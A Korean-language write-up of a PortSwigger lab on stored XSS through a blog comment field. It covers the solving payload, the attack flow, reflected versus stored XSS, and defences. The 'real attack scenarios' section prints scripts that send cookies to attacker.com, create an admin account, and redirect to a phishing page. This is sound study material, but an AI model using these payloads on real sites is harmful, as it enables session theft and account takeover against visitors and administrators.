# Lab: Stored XSS into HTML context with nothing encoded

## 개요

- **난이도**: Apprentice
- **주제**: Cross-Site Scripting (XSS) — Stored
- **링크**: https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded

## 목표

게시글 댓글 기능에 Stored XSS 취약점을 이용하여 `alert()` 함수를 실행시킨다.

## 취약점 위치

게시글 댓글 작성 폼의 `comment` 필드. 입력값이 HTML 인코딩 없이 DB에 저장되고, 이후 해당 게시글에 접근하는 모든 사용자의 브라우저에서 그대로 렌더링된다.

## 공격 방법

댓글 입력란에 `<script>` 태그를 입력하고 저장한다.

```html
<script>alert('1')</script>
```

저장 후 해당 게시글 페이지에 접근하면 댓글 영역에서 스크립트가 실행된다.

```
댓글 저장 → DB에 <script>alert('1')</script> 그대로 저장

→ 이후 페이지 접근 시 응답 HTML:
<p><script>alert('1')</script></p>

→ 브라우저가 파싱하면서 스크립트 실행
```

## Stored XSS 동작 원리

```
공격자: 악성 스크립트가 포함된 댓글 작성 → 서버 DB에 저장
                      ↓
피해자 A: 게시글 방문 → 서버가 DB에서 댓글 조회 → 스크립트 포함된 HTML 응답
                      ↓
피해자 A 브라우저: 스크립트 실행 → 쿠키 탈취 / 악성 동작
                      ↓
피해자 B, C, D ...: 동일 게시글 방문 시 동일하게 영향
```

공격자가 한 번만 삽입하면 이후 해당 페이지를 방문하는 **모든 사용자**가 영향을 받는다.

## Reflected vs Stored 비교

| 항목 | Reflected XSS (001) | Stored XSS (002) |
|------|---------------------|------------------|
| 페이로드 저장 위치 | 없음 (URL에만 존재) | 서버 DB |
| 피해 범위 | 악성 링크를 클릭한 사용자만 | 해당 페이지를 방문하는 모든 사용자 |
| 공격 지속성 | 링크 전달 시마다 필요 | 한 번 삽입 후 영구 지속 |
| 공격자 개입 | 피해자가 링크를 클릭해야 함 | 삽입 후 공격자 개입 불필요 |
| 위험도 | 중간 | **높음** |
| 탐지 난이도 | 비교적 쉬움 (URL에 노출) | 어려움 (DB에 숨어있음) |

## 핵심 정리

- 사용자가 입력한 데이터를 서버에 저장할 때 HTML 인코딩을 하지 않으면 Stored XSS가 성립한다.
- 저장된 스크립트는 해당 콘텐츠를 보는 모든 사용자에게 실행되므로 Reflected XSS보다 피해 범위가 넓다.
- 관리자 계정이 해당 페이지에 접근하면 관리자 권한으로 악성 동작을 유발할 수 있어 위험도가 더 높다.
- **방어**: 저장 시 입력값 검증, 출력 시 HTML 인코딩(`<` → `&lt;`), CSP 헤더 설정.

## 배운 점 및 추가 학습

### 1. Stored XSS가 더 위험한 이유

Reflected XSS는 피해자가 공격자가 만든 악성 URL을 직접 클릭해야 하는 조건이 필요하다. 사회공학적 기법(피싱 메일, 단축 URL 등)이 동반되어야 한다.

반면 Stored XSS는 공격자가 취약한 사이트에 페이로드를 한 번 저장해두면:
- 피해자가 평소처럼 사이트를 이용하기만 해도 실행됨
- 악성 링크 클릭 유도가 불필요
- 공격자가 오프라인 상태여도 공격이 지속됨

### 2. 고위험 저장 대상 영역

| 위치 | 이유 |
|------|------|
| 댓글 / 게시글 | 다수 사용자 방문 |
| 프로필 / 닉네임 | 다른 사용자 페이지에 노출 |
| 상품 리뷰 | 구매 전 다수가 열람 |
| 채팅 / 메시지 | 실시간으로 상대방 브라우저 실행 |
| 관리자 페이지에 노출되는 데이터 | 관리자 권한으로 악성 동작 유발 가능 |

특히 **관리자 패널에 노출되는 사용자 입력값**에 Stored XSS가 있으면 관리자 세션을 탈취하거나 관리자 권한으로 계정 생성 등의 동작을 유발할 수 있다.

### 3. 실제 공격 시나리오

```javascript
// 관리자 쿠키 탈취 → 세션 하이재킹
<script>
  new Image().src = 'https://attacker.com/steal?c=' + document.cookie;
</script>

// 관리자 권한으로 새 계정 생성 (관리자가 페이지 방문 시 실행)
<script>
  fetch('/admin/create-user', {
    method: 'POST',
    body: 'username=hacker&password=pw123&role=admin'
  });
</script>

// 방문자를 피싱 페이지로 리다이렉트
<script>
  document.location = 'https://fake-login.attacker.com';
</script>
```

### 4. 방어 심층 이해

출력 인코딩만으로는 충분하지 않은 경우도 있다.

```
[저장 시] 입력값 검증 + 화이트리스트 필터링
[출력 시] 컨텍스트에 맞는 인코딩 (HTML / JS / URL / CSS)
[브라우저] CSP 헤더로 인라인 스크립트 차단
[쿠키]    HttpOnly 플래그로 JS에서 쿠키 접근 차단
```

`HttpOnly` 쿠키는 XSS가 성공하더라도 `document.cookie`로 세션 쿠키를 읽지 못하게 막는 중요한 방어선이다.
